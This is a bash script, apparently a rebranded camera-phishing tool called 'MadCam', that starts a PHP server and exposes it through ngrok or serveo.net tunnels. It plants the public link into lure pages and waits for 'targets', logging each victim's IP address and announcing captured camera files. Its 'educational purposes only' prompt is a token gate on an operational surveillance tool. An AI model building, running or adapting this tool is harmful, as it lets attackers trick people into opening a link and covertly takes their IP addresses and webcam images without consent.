#!/bin/bash
# If you use any part from this code, giving me the credits. Read the Lincense!
# Modified By <Mr. MAD BHAI>
clear
printf "\n"
printf "\n"
printf "\n"
echo '
                              mmmm
                        so++++oooooo++++osydmM
                   +ooyhdmNNNNNNNNNNNNmmhyoo++oy
               +oydmNMMMNmdhyysoooosyyhdmNMMMNmdyo++
           +ymNMMMMMds/-.`            `.-/sdMMMMMNmy+
         +dNMNmmMNy:.                      .:yNMmmNMNd+
         /hNNMddNMd:..                        ..:dMNddMNNh/
        +mNdNdmMMd.-.                          .-.dMMmdNdNm+
       NNhNNdMMM:--`     𝐌ʳ. 𝐦𝓐𝓓 ⓑｈⓐι     --:MMMdNNyNN/
      mMsdMhNMMd.--                            --.dMMNhMdsMm:
     yMhoNMdMMMh-:-`                          `-:-hMMMdMNohMy:
     NN/hMMMMMMmshhhy+`                    `+yhhhsmMMMMMMh/NN//
    yMmdMNMMMMMMNy:----                    ----:yNMMMMMMNMdmMy-
    NMMNhyMNMMMN/`:shdds:`              `:sddhs:`/NMMMNMyhNMMN//
  +MNmMdsyMdMMM+`+hMMMMMMd+.  `-  -`  .+dMMMMMMh+`+MMMdMysdMmNM+:
  hMydMd:/MhMMM``.hMMMMMMMMNdyym``myydNMMMMMMMMh.``MMMhM/:dMdyMh-
  dMssMd++MhMMM/ `dyMMMNITIMMMMMMM::::MM NITIMMMyd` /MMMhM++dMssMd-
  dMdNMdmNMhNMMMo.:ssMMMMMMMMMy:MM:yMMMMMMMMMss:.oMMMNhMNmdMNdMd-
  hMdMMmmMMddMMy   `./ydmmdmMs.mMMm.sMmdmmdy/.`   yMMddMMmmMMdMh-
  sMmmMNdMMNhMM:`     `..-+/.:mMddMm:.//-..`     `:MMhNMMdNMmmMs-
    MMMMyNMMhMMs-`         ``+NN::NN+``         `-sMMhMMNyMMMMm//
       MMNmMMMMMdo:/osys:     `.--.`     :syso/:odMMMMMmmMMds+/
         shdmNMMMMMNMMMmmd/      ``      /dmmMMMNMMMMMNmNhy//
             :mMMmMMy:-`                `-:yMMmMMm://:dh+:
               hMMhNMdo.+-..`` ```` ``..-+.odMNhMMh-yy-dh+:
               yMModdM. y`-s`:y.//.y:`s-`y -MddoMMy-h+:Nh:+
                yMM/ooMmdd/oo :o -- o: oo/ddmMoo/MMy-+:hms:
                hMM:.-oNdhNmNdmh/ss/hmdNmNhdNo-.:MMh-/hms:
                MM:. /+`h.h:/madbhai/:h.h`+/`-:/MMdymd+/
                   Mh/`  ..+.h.-y // y-.h.+..-hhNNMNdh+/
                   Nh+-`  `..-+.//.+-..`  `/dmMMMo/  
                      h+-``          ``-+hmNhyy+/  
                     smNmh+-````````-+hmNms++yh  
                       hdsmyo+oo+oymuwqmkdwa     
                             NNNNNNNN 
                  ---------------------------------  
                 !!        𝐌ʳ. 𝐦𝓐𝓓 ⓑｈⓐι       !! 
                  ---------------------------------                  ' | lolcat
sleep 5
clear
echo "                NGROK PLEASE TURN ON YOUR HOTSPOT 
               OTHERWISE YOU DONT GET LINK...!"
sleep 3
clear
read -p $'EDUCATIONAl PURPOSES ONLY ? \e[1;91m\e[0m\e[1;33m\e[0m\e[1;90m\e[0m\e[1;92m (Y/N) : \e[0m' option
echo ""
clear

if [[ $option == *'N'* ]]; then
clear
exit
fi
if [[ $option == *'n'* ]]; then
clear
exit
fi
if [[ $option == *'No'* ]]; then
clear
exit
fi
if [[ $option == *'nO'* ]]; then
clear
exit
fi
if [[ $option == *'no'* ]]; then
clear
exit
fi
if [[ $option == *'NO'* ]]; then
clear
exit
fi

trap 'printf "\n";stop' 2

banner() {

echo '
           ___        .---------.._
    ______!gnm!_....-" .g8888888p. "-------....._
  ."          //     .g8:       :8p..---....___ \".
  | MADCAM   //  ()  d88:       :88b|==========! !|
  |  V1.1   //       888:       :888|==========| !|
  |___      \\_______"T88888888888P""----------"//|   
  |   \       """"""""""""""""""""""""""""""""""/ |   
  |    !...._____      .="""=.   .[]    ____...!  |   
  |   / This Script   ! .g$p. !   .[]          :  |   
  |  ! is Reborn as  :  $$$$$  :  .[]          :  |   
  |  !    MadCam     ! "T$P" !   .[]           . |   
  |   \__              "=._.="   .()        __    |   
  |.--'  '----._______________________.----'  '--.|
  ".________________MR._MAD_BHAI_________________." ' |lolcat
                                                                              
echo " "
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m]Script link  :\e[0m\e[1;77m %s\e[0m\n https://www.github.com/MrMadBhai/MadCam"
printf "\n"
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m]Instagram ID :\e[0m\e[1;77m %s\e[0m\n https://www.instagram.com/MrMadBhai"
printf "\n"

}

stop() {
checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1

}

dependencies() {


command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
 


}

catch_ip() {

ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip

cat ip.txt >> saved.ip.txt


}

checkfound() {

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do


if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
catch_ip
rm -rf ip.txt

fi

sleep 0.5

if [[ -e "Log.log" ]]; then
echo ""
echo '
     ---------------------------   
   !      CAM FILE RECEIVED      ! 
     ---------------------------   ' | lolcat
rm -rf Log.log
fi
sleep 0.5

done 

}


server() {

command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }

echo ""
echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m   ---------------------------   \e[0m'
echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;90m\e[0m\e[1;92m   !      STARTING SERVEO      !  \e[0m'
echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m   ---------------------------   \e[0m'

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi

if [[ $subdomain_resp == true ]]; then

$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 serveo.net  2> /dev/null > sendlink ' &

sleep 8
else
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2> /dev/null > sendlink ' &

sleep 8
fi
echo ""
echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m   ---------------------------    \e[0m'
echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;90m\e[0m\e[1;92m  !   PHP SERVER NOW STARTING   !  \e[0m'
echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m   ---------------------------    \e[0m'
fuser -k 3333/tcp > /dev/null 2>&1
php -S localhost:3333 > /dev/null 2>&1 &
sleep 3
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $send_link

}


payload_ngrok() {

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
sed 's+forwarding_link+'$link'+g' madcam.html > index2.html
sed 's+forwarding_link+'$link'+g' template.php > index.php


}

ngrok_server() {


if [[ -e ngrok ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
echo '
      ---------------------------------   
    !!         DOWNLOADING NGROK       !!  
      ---------------------------------   ' | lolcat
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
exit 1
fi

else
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf "\e[1;93m[!] Download error... \e[0m\n"
exit 1
fi
fi
fi

echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m   ---------------------------    \e[0m'
echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;90m\e[0m\e[1;92m  !   PHP SERVER NOW STARTING   !  \e[0m'
echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m   ---------------------------    \e[0m'
echo ""
php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 2
echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m   ---------------------------    \e[0m'
echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;90m\e[0m\e[1;92m  !  NGROK SERVER NOW STARTING  !  \e[0m'
echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m   ---------------------------    \e[0m'
echo ""
./ngrok http 3333 > /dev/null 2>&1 &
sleep 10

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link

payload_ngrok
checkfound
}

start1() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
default_option_server="1"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option [DEFAULT IS 1]: \e[0m' option_server
option_server="${option_server:-${default_option_server}}"
if [[ $option_server -eq 2 ]]; then

command -v php > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
start

elif [[ $option_server -eq 1 ]]; then
ngrok_server
else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
sleep 1
clear
start1
fi

}


payload() {

send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)

sed 's+forwarding_link+'$send_link'+g' madcam.html > index2.html
sed 's+forwarding_link+'$send_link'+g' template.php > index.php


}

start() {

default_choose_sub="Y"
default_subdomain="madcam$RANDOM"

printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
read choose_sub
choose_sub="${choose_sub:-${default_choose_sub}}"
if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
subdomain_resp=true
printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Subdomain: (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_subdomain
read subdomain
subdomain="${subdomain:-${default_subdomain}}"
fi

server
payload
checkfound

}

banner
dependencies
start1

